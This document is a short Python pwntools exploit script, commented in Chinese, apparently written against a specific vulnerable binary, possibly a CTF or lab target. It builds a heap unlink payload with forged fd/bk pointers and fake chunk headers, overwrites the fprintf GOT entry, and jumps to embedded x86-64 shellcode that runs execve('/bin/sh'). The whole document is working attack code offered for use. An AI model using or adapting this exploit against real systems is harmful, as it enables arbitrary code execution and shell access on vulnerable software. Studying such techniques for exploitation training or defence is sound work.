#!/usr/bin/env python3
from pwn import *

p_addr   = 0x404090               # &p 
got      = 0x404010               # fprintf@GOT ：覆寫槽位
sc_addr  = 0x4052a0 + 0x20        # shellcode 位址

shellcode = (
    b'\xe9\x14\x00\x00\x00'                             # jmp rel32 +0x14
    + b'\x90' * 20                                      # 20 NOP
    + b'\x31\xf6'                                       # xor esi, esi
    + b'\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68'       # mov rbx, "//bin/sh"
    + b'\x56'                                           # push rsi
    + b'\x53'                                           # push rbx
    + b'\x48\x89\xe7'                                   # mov rdi, rsp
    + b'\x6a\x3b'                                       # push 0x3b (59=execve)
    + b'\x58'                                           # pop rax
    + b'\x99'                                           # cdq (rdx=0)
    + b'\x0f\x05'                                       # syscall
)

# ---------------------------------------------------------------
#   從 q data (0x4052a0) 開始的 256 bytes
#   +0x00 假 Q.fd = &p-0x18  （unlink 的 FD）
#   +0x08 假 Q.bk = &p-0x10  （unlink 的 BK）
#   +0x10 NOP 分隔
#   +0x20 shellcode
#   +0x90 假 R.header.prev_size + size（騙 free 做 backward consolidation）
# ---------------------------------------------------------------

stage1 = (
    p64(p_addr - 0x18)          # fd = 0x404078
    + p64(p_addr - 0x10)        # bk = 0x404080
    + b'\x90' * 0x10            # 分隔 NOP
    + shellcode
    + b'\x00' * (0x90 - 0x20 - len(shellcode))  # 填到 0x90
    + p64(0xa0)                 # R.prev_size = 0xa0（Q 距 R 的距離）
    + p64(0xa0)                 # R.size = 0xa0（bit0=0 → 誤判 Q 已 free）
)

payload = stage1.ljust(0x100, b'\x00') + p64(got) + p64(sc_addr)

open('/tmp/input.bin', 'wb').write(payload)
print(f'[+] payload length = {len(payload)} bytes')